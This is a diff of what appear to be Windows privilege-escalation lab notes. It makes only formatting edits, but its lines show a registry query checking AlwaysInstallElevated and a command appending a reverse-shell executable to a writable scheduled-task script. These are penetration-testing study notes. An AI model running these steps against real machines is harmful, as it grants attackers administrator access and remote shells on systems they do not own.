@@ -150,9 +150,7 @@ here we will query the value **AlwaysInstallElevated** from registry key **HKLM\
 
     reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
-the return of this command is:
-
-    AlwaysInstallElevated REG_DWORD 0x1
+    -> AlwaysInstallElevated REG_DWORD 0x1
 
 0x1 means 1 so yes normal can user can install programs to admin level
 
@@ -217,5 +215,5 @@ here u'll need to find scheduled tasks which means tasks that are scheduled to r
     # check permissions:
     C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
 
-    #edit it:
+    # edit it:
     echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
